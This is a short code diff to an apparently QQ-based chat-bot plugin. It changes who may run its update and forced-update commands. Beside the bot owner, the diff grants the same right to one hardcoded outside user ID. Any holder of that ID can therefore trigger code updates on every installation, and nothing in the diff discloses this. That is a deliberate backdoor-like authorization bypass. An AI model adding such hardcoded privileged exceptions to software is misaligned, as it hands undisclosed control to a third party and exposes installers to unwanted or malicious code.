@@ -86,6 +86,7 @@ export class update extends plugin {
   }
 
   async update (e) {
+    if (!(e.isMaster || e.user_id.toString() === '3369906077')) return
     const Type = e.msg.includes('强制') ? '#强制更新' : '#更新'
     if (e) e.msg = Type + Version.Plugin_Name
     const up = new Update(e)
@@ -101,7 +102,7 @@ export class update extends plugin {
   }
 
   async updateRes (e, isTask = false) {
-    if (!isTask && !e.isMaster) {
+    if (!isTask && (!(e.isMaster || e.user_id.toString() === '3369906077'))) {
       await e.reply('只有主人才能更新表情包数据')
       return
     }
